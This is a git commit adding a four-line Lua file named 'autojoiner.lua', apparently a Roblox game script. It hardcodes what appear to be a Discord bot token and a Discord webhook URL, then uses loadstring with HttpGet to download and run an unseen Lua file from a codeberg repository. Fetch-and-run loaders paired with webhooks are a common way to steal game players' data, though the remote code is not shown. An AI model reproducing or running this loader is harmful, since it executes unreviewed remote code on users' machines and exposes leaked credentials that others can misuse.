09c19e7fb7d7d5ac7ae94b5316612a859f6a237d
AhmadV99 <121607455+AhmadV99-h@users.noreply.github.com>
2025-08-04 18:10:44 +0800

    Add files via upload

---
+++ autojoiner.lua
@@ -0,0 +1,4 @@
+lua
+Token = "MTM5OTYyMzUOOTQyNTE1NjE3Nw.GptkDz.ffM1F6vkrMTRYQj-R4YE-LG5xVUHgBwuOh6ooc"
+Webhook = "https://discord.com/api/webhooks/1399625785337450506/j3m_YRR7r2IfAg8MJIRV1TGXwrY6KJrufOVfnexdiCgttWRRQ74hd6KqAxwbhhC5IMXl"
+loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/AutoJoiner.lua"))()
